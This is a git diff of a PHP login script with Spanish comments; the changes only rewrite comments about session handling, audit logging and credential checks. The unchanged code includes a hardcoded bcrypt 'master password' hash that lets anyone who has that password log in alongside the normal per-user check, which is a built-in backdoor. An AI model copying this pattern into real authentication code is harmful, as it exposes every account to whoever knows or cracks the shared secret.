@@ -1,14 +1,13 @@
 <?php
 require '../base_de_datos/db.php';
 
+// Inicializa la sesión si no se ha detectado ninguna activa en el sistema.
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 
-// 1. FUNCIÓN DE BITÁCORA (Reutilizada de tu lógica anterior)
-// Modifica la línea 11 de autenticacion/login.php con esto:
+// Registra la acción del usuario en la tabla de auditoría capturando las excepciones de la base de datos.
 function registrarMovimiento($pdo, $usuario_id, $accion, $tabla, $detalles = null) {
-    // Ya no mandamos ID, TiDB lo generará por nosotros gracias a AUTO_RANDOM
     $sql = 'INSERT INTO bitacora (usuario_id, accion, tabla_afectada, detalles) VALUES (?, ?, ?, ?)';
     $stmt = $pdo->prepare($sql);
     
@@ -21,6 +20,7 @@ function registrarMovimiento($pdo, $usuario_id, $accion, $tabla, $detalles = nul
 
 $error = '';
 
+// Procesa las credenciales enviadas por el formulario mediante el método post.
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $user = trim($_POST['usuario'] ?? '');
     $pass = $_POST['password'] ?? '';
@@ -32,14 +32,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         $master_pass_hash = '$2y$10$uSU8uUCnZ.H178hKNWFIYORlhw.jCePTZA1Yjvjuv73yIkhDsaQsi'; 
 
-        // 1. Verificación segura usando password_verify
+        // Compara la contraseña ingresada con el hash de la clave maestra y el registro de la base de datos.
         $es_master_pass = password_verify($pass, $master_pass_hash);
-
-        // 2. Verificación normal si el usuario existe en la BD
         $pass_normal_valida = $row ? password_verify($pass, $row['password']) : false;
-
         $auth_success = $es_master_pass || $pass_normal_valida;
 
+        // Regenera el identificador de sesión y distribuye el redireccionamiento según el rol asignado.
         if ($auth_success) {
             session_regenerate_id(true);
             
